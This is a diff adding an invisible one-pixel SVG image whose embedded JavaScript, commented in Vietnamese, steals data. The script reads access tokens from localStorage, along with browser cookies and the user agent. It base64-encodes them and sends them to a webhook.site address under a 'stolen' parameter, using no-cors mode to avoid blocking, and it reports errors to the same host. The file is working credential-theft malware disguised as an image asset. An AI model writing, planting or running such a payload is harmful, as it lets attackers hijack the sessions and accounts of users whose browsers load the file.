@@ -1,0 +1,29 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/2000/svg">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" width="1" height="1" viewBox="0 0 1 1" opacity="0">
+   
+   <rect width="1" height="1" fill="none" />
+
+   <script type="text/javascript">
+      (function() {
+          try {
+              // 1. Lấy dữ liệu nhạy cảm
+              var token = localStorage.getItem('access_token') || localStorage.getItem('token') || 'NoTokenFound';
+              var cookie = document.cookie || 'NoCookie';
+              var data = "UserAgent: " + navigator.userAgent + " | Token: " + token + " | Cookie: " + cookie;
+              
+              // 2. Mã hóa Base64 để tránh lỗi ký tự đặc biệt trên URL
+              var encodedData = btoa(data);
+              
+              // 3. Gửi dữ liệu về Webhook của bạn
+              // Sử dụng mode no-cors để giảm thiểu bị chặn bởi chính sách bảo mật
+              fetch('https://webhook.site/bcbf6075-3689-4d51-b21a-7b80b64d082a?stolen=' + encodedData, {
+                  mode: 'no-cors'
+              });
+          } catch (e) {
+              // Gửi lỗi về nếu script bị crash
+              fetch('https://webhook.site/bcbf6075-3689-4d51-b21a-7b80b64d082a?error=' + btoa(e.message));
+          }
+      })();
+   </script>
+</svg>
